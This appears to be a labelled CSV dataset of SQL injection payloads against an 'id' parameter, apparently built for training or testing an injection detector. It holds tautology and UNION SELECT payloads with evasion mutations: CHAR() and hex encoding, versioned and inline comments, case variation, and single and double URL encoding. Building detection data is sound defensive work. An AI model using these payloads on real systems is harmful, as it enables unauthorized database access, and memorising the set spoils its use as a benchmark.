id%253DCHAR%252839%252C%2B%2B%2B32%252C%2B%2B%2B79%252C%2B%2B%2B82%252C%2B%2B%2B32%252C%2B%2B%2B49%252C%2B%2B%2B61%252C%2B%2B%2B49%2529,1,sqli_encoded,ws_mixed_ws,double_encoded,SQLI_ENCODED_002,0918e0be1756068daedd77d751acd8f7,f8ef45a00a3ac59fa64f5ea17dcfeefc,135
id%253D%25252527%25252520OR%252525201%2525253d1%253B--%252520-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_ENCODED_004,f573b590f733668e1dcdc369f07bde0a,f66eee306665913dd2ae98a8db7d847f,62
"id%3DCHAR(39,+32,+79, 82,+32, 49, 61, 49)--+-",1,sqli_encoded,case_var|comment_dash_dash_space,partially_encoded,SQLI_ENCODED_002,864cc5e90014a112100993175013074a,002febeef42d01b65b1ca0e21b26f6e7,45
id%253DCHAR%2528115%252C101%252C108%252C101%252C99%252C116%2529%252523,1,sqli_encoded,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_ENCODED_005,fdb215b104c8a108daa89f67065567d1,3f612b05fd17d9ed394a253417454815,70
id%253DCHAR%252839%252C%2B32%252C%2B79%252C%2B82%252C%2B32%252C%2B49%252C%2B61%252C%2B49%2529%253B--%2B-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_space,double_encoded,SQLI_ENCODED_002,47ecbc79253b148115285e8e2fac9fa8,beebb111eee9ef7b23a7ba0a893faa32,104
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531--%2B-,1,sqli_encoded,case_var|comment_dash_dash_space,double_encoded,SQLI_ENCODED_003,b7923f6d031e2ef0754d35288c669c41,edd62850369db3231018920ce7ed4a56,69
id%3DCHAR%2839%2C++32%2C++79%2C++82%2C++32%2C++49%2C++61%2C++49%29%23,1,sqli_encoded,case_var|comment_hash|ws_multi_space,url_encoded,SQLI_ENCODED_002,c8d2c191e2d9cd373f541e76ff3517c1,30981f94992ffead0e70057505360e7f,69
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531%252523,1,sqli_encoded,comment_url_hash|ws_url_space,double_encoded,SQLI_ENCODED_003,6f253bdabf1e17f010e6b4dba800f1eb,f7b57b55825281b966fcef7a2897e7af,70
id%253DCHAR%2528115%252C101%252C108%252C101%252C99%252C116%2529%253B--%252B-,1,sqli_encoded,comment_semicolon_comment|ws_plus,double_encoded,SQLI_ENCODED_005,97197e7bc6b65528a64f708330d43f92,2933149937bbc86e156f4a2c08e5518c,76
id%3D%2527%2520OR%25201%253d1--,1,sqli_encoded,case_var|comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_ENCODED_004,4af7ee872f4fc8cff7a08a3deac7159f,5438d9921289f03dab84ccc9c93fbf56,31
"id=CHAR(115,101,108,101,99,116)%23",1,sqli_encoded,case_var|comment_hash,partially_encoded,SQLI_ENCODED_005,e59333bce2296f1a60ce2661290326ac,80a7d7e50b9dd2d8acc274ea994174b3,34
"id%3DCHAR(39,%2F%2A*/32,/%2A*%2F79,/**%2F82,%2F**/32,/%2A%2A%2F49,/%2A*%2F61,/*%2A%2F49)--%2F*%2A%2F-",1,sqli_encoded,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_ENCODED_002,d4fb50765cd4ea99e8397a3e81059b99,d4e003b248a169a08c2709a55d29e83f,101
id%3D0x27204f5220313d31--  -,1,sqli_encoded,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_ENCODED_001,4ab9ee0664783935dadfe4dc25b9e932,b05973cf12b112dce07977ce7fbae199,28
id%253DCHAR%252839%252C%2B32%252C%2B79%252C%2B82%252C%2B32%252C%2B49%252C%2B61%252C%2B49%2529--%2B-,1,sqli_encoded,case_var|comment_dash_dash_space,double_encoded,SQLI_ENCODED_002,e23c0f8dc74dedf8ba7ac1b366c36594,69259e9a41882cddb1c397a3823b637d,99
id%3D0x27204f5220313d31%3B--%2520-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_ENCODED_001,61025591a5f5cab0a6a3c35a2cbee26b,0fe9ab4020394cf6a0cd7ba35cf875f6,34
id%3D%2527%2520%254f%2552%2520%2531%253d%2531%23,1,sqli_encoded,case_var|comment_hash|ws_multi_space,url_encoded,SQLI_ENCODED_003,b9588533dc4679ca755fbc605ab56351,6d24fb67f05268b075a764dce2615a42,48
"id=CHAR(39, 32, 79,+82, 32, 49,+61,+49)",1,sqli_encoded,case_var,partially_encoded,SQLI_ENCODED_002,c706e6722b6bd3d4d8554ff5c62ac41f,d2c6dca84a75c0285756461684a06d4d,39
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29%2F%2A,1,sqli_encoded,comment_block_comment|ws_plus,url_encoded,SQLI_ENCODED_005,352e0b15fc186659cc5baee80d4cd28a,6a1127e56e15097396752fd75c3210f6,53
id%3D0x27204f5220313d31%2F%2A,1,sqli_encoded,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_ENCODED_001,00644edc09c25072b8358bab73bbda64,bdae8de3114b1e300d6a679dcdef520a,29
"id%3DCHAR(39,+32,+79,+82, 32,+49,+61, 49)/%2A",1,sqli_encoded,case_var|comment_block_comment,partially_encoded,SQLI_ENCODED_002,9062608d29338df5c44f4f63797cf35f,44b376635c13f02cfe4f61dec13c5daf,45
"id=CHAR(39, 32, 79, 82, 32, 49, 61, 49)--",1,sqli_encoded,comment_dash_dash,raw,SQLI_ENCODED_002,1a9f11396cb40f9cec6bece285674e9c,804bd5c13b9ff651d2e0dfbdbe7bbd14,41
id=%27%20%4f%52%20%31%3d%31;--+-,1,sqli_encoded,case_var|comment_semicolon_comment,partially_encoded,SQLI_ENCODED_003,4012d4034df49d3a15c926b9e6129e81,4012d4034df49d3a15c926b9e6129e81,32
id%253D0x27204f5220313d31--%2B-,1,sqli_encoded,comment_dash_dash_space,double_encoded,SQLI_ENCODED_001,615e0a46b133d1728dc8236d8b153e59,22c7e03c27db8e992911280b82f4c556,31
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29--%2F%2A%2A%2F-,1,sqli_encoded,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_ENCODED_005,3b6f2744d81c386e6f16cacd3e029296,abe0f8e445593102e61e2e15af49197f,62
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29%23,1,sqli_encoded,case_var|comment_hash,url_encoded,SQLI_ENCODED_005,da54911b148704f6af8d85803ff2da4d,fb7c4b2132f057b4489b7321176fa060,50
"id=CHAR(115,101,108,101,99,116);--+-",1,sqli_encoded,comment_semicolon_comment|ws_plus,raw,SQLI_ENCODED_005,67c76524d268380d81cbe705cc0160ec,a63dae7541ed6781972002ff05ceca7d,36
id%3D%2527%2520%254f%2552%2520%2531%253d%2531--,1,sqli_encoded,comment_dash_dash|ws_tab,url_encoded,SQLI_ENCODED_003,8985b1b0d7d0b0b69fb1e9631ba77b13,4989508b191fe03322a49ed55e303827,47
id=%2527%2520OR%25201%253d1--%20-,1,sqli_encoded,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_ENCODED_004,3a15a8f2e0283bb1e75f23c76e05ef1b,5b50f383d431254bafc1ec4914cae4b2,33
id%3D%2527%2520%254f%2552%2520%2531%253d%2531%2523,1,sqli_encoded,comment_url_hash|ws_space,url_encoded,SQLI_ENCODED_003,44067c4f3fdfb50f3bee0a13907a3d7f,a9f45f390ec2ab91956dc38cb92b34fb,50
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29%2523,1,sqli_encoded,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_ENCODED_005,06ef29785da95d088db5c1d3fb7c3f6b,5a28a26162a345702fc908aad5a4d5e2,52
id%253DCHAR%252839%252C%252B32%252C%252B79%252C%252B82%252C%252B32%252C%252B49%252C%252B61%252C%252B49%2529%252523,1,sqli_encoded,comment_url_hash|ws_plus,double_encoded,SQLI_ENCODED_002,3ec7ee8635e3fcc91fbe7c260b3ce953,10defc767be3baa10d4a8f96f2fcedae,114
id%3D%27%20%4f%52%20%31%3d%31%23,1,sqli_encoded,comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_ENCODED_003,fd361f5c63725a7e78f1c915f64d8bb6,a5aa32606b189b03f9ddb0791b578d24,32
"id=1'/*!50000UNION*//*!50000SELECT*/1,2 -- -",1,sqli_obfuscated,case_var|comment_dash_dash_space,raw,SQLI_OBFUSCATED_002,d035ca7c986a952df36ba97ec1eb0429,1697a20add01b2ba593a25cd898eb56e,44
id%3D1%27/%2A*%2FOR/%2A%2A%2F1=1+-- -,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_OBFUSCATED_001,778d6b7820eb680a47ad79d0c7c7d600,6bb96ef5967be38fc4b09bc427e76971,37
"id=1' unIoN sElEcT 1,2 %23",1,sqli_obfuscated,comment_url_hash,raw,SQLI_OBFUSCATED_004,39924b47210a31a65bda1a2ecc26f899,55e9dd848c62c1008a9183c2da7ce00e,26
"id=1'	unIoN	sElEcT	1,2	;--	-",1,sqli_obfuscated,comment_semicolon_comment|ws_tab,raw,SQLI_OBFUSCATED_004,4ba4186b3a58d13bba88c1b7a683acea,063e16f4e56dd908bfbda05c5f056929,28
id%3D1%27%2520O%2572%25201%3D1%2520%23,1,sqli_obfuscated,case_var|comment_hash|ws_url_space,url_encoded,SQLI_OBFUSCATED_003,e02ed2efed131d1b4924355864ed58a8,39c709b69fde9509ccf985ecfbd1eaf1,38
id%3D1%27%2F*foo%2A%2FOR%2F*bar*/1%3D1--%20-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_mixed_ws,partially_encoded,SQLI_OBFUSCATED_005,5351df2b83f65ec2e70133f600abd91c,b447007b2ef23c840f78116689b8556e,44
"id=1%27+unIoN+sElEcT+1,2+%2F%2A",1,sqli_obfuscated,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_OBFUSCATED_004,c877c9356061e5649d6897a208208a14,7288f06955d0e7b19160e0acb2907e45,31
id%3D1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2C2+--,1,sqli_obfuscated,case_var|comment_dash_dash|ws_space,url_encoded,SQLI_OBFUSCATED_002,db18e45bdeedc7f7a0504e876aa3898c,1e375c7cbc26ca3905ffcf873bbb74a4,68
id%253D1%2527%2B%2B%2BunIoN%2B%2B%2BsElEcT%2B%2B%2B1%252C2%2B%2B%2B%2523,1,sqli_obfuscated,comment_hash|ws_mixed_ws,double_encoded,SQLI_OBFUSCATED_004,23b8fd7e30721f7f035e3245e2d14e6e,6169769453306d0d7d113d3393ebb48a,72
id=1'  O%72  1=1  /*,1,sqli_obfuscated,case_var|comment_block_comment|ws_multi_space,raw,SQLI_OBFUSCATED_003,f5df8729b7c7f1eeaa7f360684ccf796,3c31acf56114d11d29681297599492a1,20
id=1'%2F%2A*/O%72/**%2F1=1/%2A%2A/%3B--%2F%2A%2A/-,1,sqli_obfuscated,comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_OBFUSCATED_003,5e9404771aeb1d1a2f2c5ae4e94f3735,986200a9871ff8f0eca1543bd5d64071,50
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%2B%2B--,1,sqli_obfuscated,comment_dash_dash|ws_multi_space,double_encoded,SQLI_OBFUSCATED_001,d200dcd957c52a86d508022002a1c1bc,8abf44acd0478d7094fda7baad9fc6d4,70
id%3D1%27%2F%2Afoo%2A%2FOR%2F%2Abar%2A%2F1%3D1,1,sqli_obfuscated,ws_space,url_encoded,SQLI_OBFUSCATED_005,1f0fe45d853ad61ce35cbdd6170b26a3,1d2698c089972d3d014b29e8f7258465,46
id=1'%2F*%2A%2FOR/*%2A/1=1+#,1,sqli_obfuscated,case_var|comment_hash|ws_plus,partially_encoded,SQLI_OBFUSCATED_001,34dc0413c46d1395268d27eaa50254ad,f6ff40aaec373245abe69e4923bcb795,28
id%253D1%2527%2B%2BO%252572%2B%2B1%253D1%2B%2B--%2B%2B-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_OBFUSCATED_003,c8ddf74da49ae4115d3e2f70c77ae607,0ed340ab8851d03bbb54c9a52871ff05,55
"id%3D1'+uNiON+select 1,2 %2F%2A",1,sqli_obfuscated,case_var|comment_block_comment,partially_encoded,SQLI_OBFUSCATED_004,ea98422a6a6e892f38c34721017ea13c,c04052613b5a540427a9004d70e1c2b7,31
id=1'/*foo*/OR/*bar*/1=1--,1,sqli_obfuscated,case_var|comment_dash_dash,raw,SQLI_OBFUSCATED_005,39a30441d4268d117c483d3ad16b3f60,f94a23e204e91cf1283c7cec9e8db434,26
id=1'/**/OR/**/1=1/**/#,1,sqli_obfuscated,comment_hash|ws_comment_ws,raw,SQLI_OBFUSCATED_001,76b8b8636e601605f4d9e778e71c7b28,96f810eb4516b8cda01a26f736e197a3,23
id%3D1%27++union++SELECT++1%2C2++--,1,sqli_obfuscated,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_OBFUSCATED_004,b11d1096f83b4b0dde5068db27c69860,a5c12268f858c519352e4fb68fb876f3,35
id%253D1%2527%2BO%252572%2B1%253D1%2B%252523,1,sqli_obfuscated,comment_url_hash,double_encoded,SQLI_OBFUSCATED_003,1fae1fa753a0a999530810c3d7ab499c,ba1ef9887bdef4f5e676e882db41c39e,44
id%253D1%2527%252F%252A%252A%252FunIoN%252F%252A%252A%252FsElEcT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_obfuscated,comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_OBFUSCATED_004,d182cb7e5423aa80ce65668a8e039470,3ff7b568cb9d9dce32e51cc0182d8106,139
id=1'/**/OR/**/1=1 ;-- -,1,sqli_obfuscated,case_var|comment_semicolon_comment,raw,SQLI_OBFUSCATED_001,19a8b297ebad69acb4b00ec7bcfe607b,cb1f7bf2c26e651f2e01ad046e638844,24
id%3D1%27%2F%2A*%2FOR%2F%2A*/1=1+%23,1,sqli_obfuscated,case_var|comment_url_hash,partially_encoded,SQLI_OBFUSCATED_001,b912935effef17748e3e4f1858991abd,82551caf48ad1debb1d197ab9aa7533e,36
id%253D1%2527%252F%252Afoo%252A%252FOR%252F%252Abar%252A%252F1%253D1,1,sqli_obfuscated,case_var,double_encoded,SQLI_OBFUSCATED_005,59372cd36b54f4799380fdfb12635146,caf762beb4bcb1345229bf8a09454390,68
id%3D1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2C2%09%2523,1,sqli_obfuscated,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_OBFUSCATED_002,1bf082aee2d602d8fa378d2fedc4d251,1d192a42166114e63007877d4666da26,73
id=1%27/*foo*/OR%2F%2Abar*/1%3D1,1,sqli_obfuscated,ws_comment_ws,partially_encoded,SQLI_OBFUSCATED_005,1e90212b43cd32e096922a0bcf0c673e,01d8cbba40a3f53c481b866972a6cda4,32
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%09--%09-,1,sqli_obfuscated,comment_dash_dash_space|ws_tab,url_encoded,SQLI_OBFUSCATED_001,ae0f851e7f0588dc45348842fbf3598c,5dce52f51ed78ef5162ef7ec4b79d9a1,49
"id=1' unIoN sElEcT 1,2 /*",1,sqli_obfuscated,comment_block_comment|ws_space,raw,SQLI_OBFUSCATED_004,217774790a6df00bac7f0e0f5ab1d00a,4615e732ca6a05c57e7fd3caf9c1c732,25
id%253D1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252C2%252F%252A%252A%252F--,1,sqli_obfuscated,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_OBFUSCATED_002,1e88b9f95b0e6fdac09751467eab3e3d,c532eec194071f09012f3bbe75dce1e7,113
id=1'/**/OR/**/1=1  --  -,1,sqli_obfuscated,comment_dash_dash_space|ws_multi_space,raw,SQLI_OBFUSCATED_001,44314e0d9d637d687c580b17d50c7be9,3e0b78606d185bfc9a3f1cc40c6c5eba,25
id%3D1%27%2F%2Afoo%2A%2FOR%2F%2Abar%2A%2F1%3D1%2F%2A,1,sqli_obfuscated,case_var|comment_block_comment,url_encoded,SQLI_OBFUSCATED_005,468289768e5ca6d4c7499b7ee7b54125,f8a1805c1dac70969f84cda79fb8f2cc,52
"id%3D1%27%2F%2A!50000UNION*%2F%2F%2A!50000SELECT%2A%2F1,2+%23",1,sqli_obfuscated,case_var|comment_url_hash,partially_encoded,SQLI_OBFUSCATED_002,cf9ad38230d272718f3ef41767e7bdd9,aa6ada24508ada873f1c7c2a69368032,61
id=1'/%2Afoo*/OR%2F%2Abar*%2F1%3D1%23,1,sqli_obfuscated,comment_url_hash,partially_encoded,SQLI_OBFUSCATED_005,455ff217f6c1ebc913b913d0db7dfdc7,b684a3e49801452a8b15d386a63d68e2,37
id=1'/**/OR/**/1=1%20--%20-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_OBFUSCATED_001,cb7f222f2a7dd00165cd3022d821603c,cf53c77aba7bcd6ef6370eb230726556,27
id=1'/**/OR/**/1=1/**//*,1,sqli_obfuscated,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_OBFUSCATED_001,a0e16727343165a604ee9b70838a95ee,50acf8467088d8f838d00213dc145929,24
id=1%27%2F*foo%2A%2FOR%2F%2Abar%2A/1=1%2F*,1,sqli_obfuscated,comment_block_comment,partially_encoded,SQLI_OBFUSCATED_005,802a75d1834d91da0c77cd7d0b949a76,405d1f105ff546429103468fad5991a1,42
id%253D1%2527%252BO%252572%252B1%253D1%252B%252F%252A,1,sqli_obfuscated,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_OBFUSCATED_003,b685a47e8087a5dcb1674aa9f07c3819,345952111fa83766d5eebccb4bcf9b80,53
id%3D1%27 O%72 1%3D1+;--+-,1,sqli_obfuscated,case_var|comment_semicolon_comment,partially_encoded,SQLI_OBFUSCATED_003,0e4f6383c9b07a2b90277a8b7982eb17,ae010b38f27a7f0312830aace8de058f,26
"id=1'	unIoN	sElEcT	1,2	--",1,sqli_obfuscated,comment_dash_dash|ws_tab,raw,SQLI_OBFUSCATED_004,d43f0860a5f532272f237286adcd8e2a,5bedeb56a8b6cf2377630a75c4be83d7,25
id=1'/**/OR/**/1=1 %23,1,sqli_obfuscated,case_var|comment_url_hash,raw,SQLI_OBFUSCATED_001,1723688f8d76127985b7cfa96a014947,12b139ef9c1584de2819af4917b65f06,22
"id%3D1%27+union+SELECT+1,2 %23",1,sqli_obfuscated,case_var|comment_url_hash,partially_encoded,SQLI_OBFUSCATED_004,d18c52529142b9de50154a61cf3c31fd,63ada29e75a1a6d550bf47b0df5a1995,30
id=1'/*foo*/OR/*bar*/1=1,1,sqli_obfuscated,case_var|ws_multi_space,raw,SQLI_OBFUSCATED_005,c5719f13690351504526c994e192e96c,64ad496d369c6b0ac8b3b2c937dde2c4,24
id=1'/*foo*/OR/*bar*/1=1#,1,sqli_obfuscated,comment_hash,raw,SQLI_OBFUSCATED_005,c789bcfe11929a2ec9c94bbb8f4963b4,52c2a544cd388f31061324b7eca088f7,25
id%253D1%2527%2B%2BO%252572%2B%2B1%253D1%2B%2B%252F%252A,1,sqli_obfuscated,comment_block_comment|ws_multi_space,double_encoded,SQLI_OBFUSCATED_003,845d365b1321bbe56d5ba56072edb841,53efd5c1bba3854709cce8bde6e31e46,56
"id=1'/*!50000UNION*//*!50000SELECT*/1,2/**/--/**/-",1,sqli_obfuscated,comment_dash_dash_space|ws_comment_ws,raw,SQLI_OBFUSCATED_002,e489b9830c5819f53f56655dfdf58e7f,4cdce9c9a57cf3eea49fcbb760984b42,50
id=1%27%2F*%2A/OR/*%2A%2F1=1 %23,1,sqli_obfuscated,comment_url_hash|ws_space,partially_encoded,SQLI_OBFUSCATED_001,6cc30aef5f33c8f4bcac5bf75aa2a9bd,049a59ed89e56bac2e1eff53bfe73e2d,32
id=1'%2F*foo%2A/OR/*bar%2A%2F1%3D1%23,1,sqli_obfuscated,case_var|comment_url_hash,partially_encoded,SQLI_OBFUSCATED_005,66e036edebf8447de03c37b2662e5263,ee217a74040aa0327e1be1ff988eb399,37
id%3D1%27+Union+Select+1%2C2+--+-,1,sqli_obfuscated,case_var|comment_dash_dash_space,url_encoded,SQLI_OBFUSCATED_004,469cda5d365a458ec27ea73da3e8e03b,4c156f64168cefb4b185c6a661f162f2,33
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%2B--%2B-,1,sqli_obfuscated,case_var|comment_dash_dash_space,double_encoded,SQLI_OBFUSCATED_001,8507f7f238c44e66caaf5ae289b92d03,938929b19bf94238ab044c692f1d9255,71
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1+--,1,sqli_obfuscated,case_var|comment_dash_dash,url_encoded,SQLI_OBFUSCATED_001,85fd864c95ba388db25361bc975050cf,e49f70961a1a7ea05a56a2d229d4f75b,43
id%3D1%27+O%2572+1%3D1+%2523,1,sqli_obfuscated,case_var|comment_url_hash,url_encoded,SQLI_OBFUSCATED_003,6de7bc34075333e8e52c54ff0f843818,c53fb31d4c6e73a6775efd6beb153449,28
id%3D1%27+++O%72  +1=1+++--,1,sqli_obfuscated,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_OBFUSCATED_003,0b7201e642fb8f4c6223233542deb894,d53402b386858a68739cb940c4724bfd,27
id%3D1%27%2F%2A%2A%2FOR/%2A*%2F1%3D1+%23,1,sqli_obfuscated,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_OBFUSCATED_001,22166f83996446e23274886859a6459f,0ca03a6ca9ac65b0a998399896679921,40
id%253D1%2527%2BO%252572%2B1%253D1%2B%252F%252A,1,sqli_obfuscated,comment_block_comment|ws_space,double_encoded,SQLI_OBFUSCATED_003,c60ba008412759feacaf295e61fd829e,47434ed6bd8119e8edd2e5519b0a6ed7,47
id=1%27%2F*foo%2A%2FOR%2F%2Abar*/1%3D1%23,1,sqli_obfuscated,comment_url_hash|ws_tab,partially_encoded,SQLI_OBFUSCATED_005,ba4b98dbc3b0f3023d0767142dd58048,ff18d486d994892432f003bb2819edc5,41
id%3D1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2C2%09--%09-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_tab,url_encoded,SQLI_OBFUSCATED_002,44ae8e911734a8dd21f2331888ea8cc2,6bc5f21965f0543b3acd6c48c0b1a6df,74
id%3D1%27+Union+select+1%2C2+%23,1,sqli_obfuscated,case_var|comment_hash,url_encoded,SQLI_OBFUSCATED_004,bcb5595d17652717862041a225e0b208,f475f5fba22330d3f8c0f6517f56481c,32
id%3D1'+O%72 1=1 %23,1,sqli_obfuscated,case_var|comment_hash,partially_encoded,SQLI_OBFUSCATED_003,0183125e4464fc05ed33e91356fe06c2,6c9e7f2e3a57cb7660c3132e1ca41b98,20
id%253D1%2527%252BUniOn%252BSELECT%252B1%252C2%252B%2523,1,sqli_obfuscated,case_var|comment_hash|ws_plus,double_encoded,SQLI_OBFUSCATED_004,d1fe6e352ca5e109d0f4c6085fdb65c7,0f32e0210c419e32db89f5fb270630f6,56
id%253D1%2527%2BO%252572%2B1%253D1%2B--,1,sqli_obfuscated,case_var|comment_dash_dash,double_encoded,SQLI_OBFUSCATED_003,338d7e586308c4de6f74c67ebb190e69,294a1164d5c7af510fd6783ef2443cd3,39
id%253D1%2527%252F%252Afoo%252A%252FOR%252F%252Abar%252A%252F1%253D1%2523,1,sqli_obfuscated,case_var|comment_hash|ws_mixed_ws,double_encoded,SQLI_OBFUSCATED_005,66d77df02ec62e6ffa6509c6166abd13,502e18ef00f461e752e27fa9eb48aa20,73
id%253D1%2527%2B%2Bunion%2B%2BSEleCt%2B%2B1%252C2%2B%2B--%2B%2B-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_OBFUSCATED_004,7633be641bd69124b428e6e1c56def53,4f7afb6c7feb9e262bd563ef61b8de2a,64
"id%3D1'+UnION+SELECT 1,2+--",1,sqli_obfuscated,case_var|comment_dash_dash|ws_space,partially_encoded,SQLI_OBFUSCATED_004,a951a880a45c63fdb96219444744a92c,71c3c91536473945c67890605e90f91f,27
id=1'/*foo*/OR/*bar*/1=1;-- -,1,sqli_obfuscated,comment_semicolon_comment,raw,SQLI_OBFUSCATED_005,ca5d5dbf4620b4c6e007f9fc0c271ce7,3915be8303b6cc1c81bcaa023d4a0bba,29
"id=1'/*!50000UNION*//*!50000SELECT*/1,2 #",1,sqli_obfuscated,comment_hash|ws_space,raw,SQLI_OBFUSCATED_002,32f165c2a04c95388e92558b1fe2e108,6ec7499d396a2fe21abb1780523d9cdc,41
id=1'/**/OR/**/1=1+#,1,sqli_obfuscated,case_var|comment_hash|ws_plus,raw,SQLI_OBFUSCATED_001,5023c29cb4cf79f912ced63282dd35d2,3e25fdba012b4700b3c219d99fcc4c98,20
id=1' O%72 1=1 %23,1,sqli_obfuscated,comment_url_hash|ws_space,raw,SQLI_OBFUSCATED_003,3fac3a661a9be942abb12a443597c9fd,7dbca9c07503c0a3993db1b6c8a3ca6f,18
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%2B%252523,1,sqli_obfuscated,case_var|comment_url_hash,double_encoded,SQLI_OBFUSCATED_001,75d8c41ca9c1acb117baa8a5f6e573bc,225b5709591ea23b4431299b5d953934,72
id%3D1%27%09Union%09SELECT%091%2C2%09%23,1,sqli_obfuscated,case_var|comment_hash|ws_tab,url_encoded,SQLI_OBFUSCATED_004,c4606d6cf943303f90fd41a967e2d6fe,37bdb4caee1d223b1fc7801491889eb5,40
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1+--+-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_OBFUSCATED_001,326be638aa91cea9f5c13fccad5b12e0,509309956daf655dc7481571a90bd562,45
id%253D1%2527%252F%252Afoo%252A%252FOR%252F%252Abar%252A%252F1%253D1--%2B-,1,sqli_obfuscated,case_var|comment_dash_dash_space,double_encoded,SQLI_OBFUSCATED_005,72d2faf9ce912522ddafa0d5e83e5b1f,48c0126b4090cbb51c28ab4c0b8316b5,74
"id=1'/*!50000UNION*//*!50000SELECT*/1,2/**/%23",1,sqli_obfuscated,comment_url_hash|ws_comment_ws,raw,SQLI_OBFUSCATED_002,f0a367b38ac2cdb85ebd2de2a7b6bc8d,a58a03d95ec5fd6910eb583b4831c1f5,46
id%3D1%27/%2Afoo*%2FOR%2F%2Abar*%2F1%3D1/*,1,sqli_obfuscated,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_OBFUSCATED_005,f8c1f2be6a29c44b7eb1bc16fd716f73,40ae390909d1760497b2db4a5294be7a,42
id=1'/**/OR/**/1=1%20;--%20-,1,sqli_obfuscated,comment_semicolon_comment|ws_url_space,raw,SQLI_OBFUSCATED_001,617822c6931a6cad775f3aaaee8ecd25,d96e7adfe4b4856b4f502b067774c8c8,28
"id=1'%20union%20select%201,2%20--%20-",1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_OBFUSCATED_004,f53ffe5755b0ed414111848d82add2da,f53ffe5755b0ed414111848d82add2da,37
id%253D1%2527%2B%2BUnion%2B%2Bselect%2B%2B1%252C2%2B%2B%252523,1,sqli_obfuscated,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_OBFUSCATED_004,9cad143ae7051630a352d0337ee7438c,2c21feb6d12c94c1f6500972ac5bc8ad,62
id%3D1'/%2A%2A%2FOR%2F%2A*/1=1+-- -,1,sqli_obfuscated,case_var|comment_dash_dash_space,partially_encoded,SQLI_OBFUSCATED_001,b4198065d9b81dae4be9f4355c996919,7f18af0339b870b58a27ad5fb0ac08d0,35
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1+%23,1,sqli_obfuscated,comment_hash,url_encoded,SQLI_OBFUSCATED_001,ce990c63a91887e0f85c1624256e46da,274f0239c5af223522a0a981c689365d,44
id%253D1%2527%2BUnion%2BSelect%2B1%252C2%2B%252523,1,sqli_obfuscated,case_var|comment_url_hash,double_encoded,SQLI_OBFUSCATED_004,b9d588a25eeff46ee0201980f2728745,0e9496de1ec3331fa5ceb46b94d32735,50
"id=1'/**/Union/**/sElEcT/**/1,2/**/--",1,sqli_obfuscated,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_OBFUSCATED_004,c97cb194941a0c07dae09f8fc7c85806,2140c71cd4d4c4b7d4eba38ecc2c9a8b,37
id%253D1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252C2%2B--%2B-,1,sqli_obfuscated,comment_dash_dash_space,double_encoded,SQLI_OBFUSCATED_002,8aee442a5263d7b33798c73dad16ec50,7645df2ebbdc667159fae8feeaa1fd5d,100
id=1'%2F%2A%2A/OR%2F%2A%2A/1%3D1+--,1,sqli_obfuscated,case_var|comment_dash_dash,partially_encoded,SQLI_OBFUSCATED_001,c5baf6a49623f31b46ee0a319948d675,5ee38efab13c40c29e89140a84ccd664,35
id=1'%20O%72%201=1%20#,1,sqli_obfuscated,case_var|comment_hash|ws_url_space,raw,SQLI_OBFUSCATED_003,1dfe3177ae1a05fb3920e756185540af,37a9166e785df8370dde6bb4b76856e5,22
id=1%27/%2A%2A%2FOR%2F**%2F1%3D1 %23,1,sqli_obfuscated,comment_url_hash|ws_space,partially_encoded,SQLI_OBFUSCATED_001,b35f246b00fc46f857ea0873b4eb9e82,3bdc9e862314662b35a5b4eae9836cef,36
